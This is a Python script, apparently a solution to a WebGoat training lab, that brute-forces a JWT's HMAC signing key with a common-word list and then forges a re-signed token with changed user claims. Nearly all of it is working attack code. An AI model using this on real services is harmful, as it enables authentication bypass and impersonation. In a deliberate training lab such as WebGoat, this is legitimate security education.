#!/usr/bin/python 
# -*- coding: utf-8 -*- 

import sys
reload(sys)
sys.setdefaultencoding('utf8')

import base64  
import hashlib  
import hmac  
  
def jwt_tokens_5():  
     token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM'.split('.')  
  
     payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"tom@webgoat.com","username":"WebGoat","Email":"tom@webgoat.com","Role":["Manager","Project Administrator"]}'.encode()  
  
     unsigned_token = (token[0] + '.' + token[1]).encode()  
  
     # signature is base64 URL encoded and padding has been removed, so we must add it  
     signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()  
  
     with open('google-10000-english.txt', 'r') as fd:  
         lines = [line.rstrip('\n').encode() for line in fd]  
  
     def hmac_base64(key, message):  
         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))  
  
     for line in lines:  
         test = hmac_base64(line, unsigned_token)  
  
         if test == signature:  
             print('Key: {}'.format(line.decode()))  
             new_token = (token[0] + '.' + base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()  
             new_signature = hmac_base64(line, new_token)  
             new_token += ('.' + new_signature.decode().rstrip('=')).encode()  
             print('New token: {}'.format(new_token.decode()))  
             return  
  
jwt_tokens_5()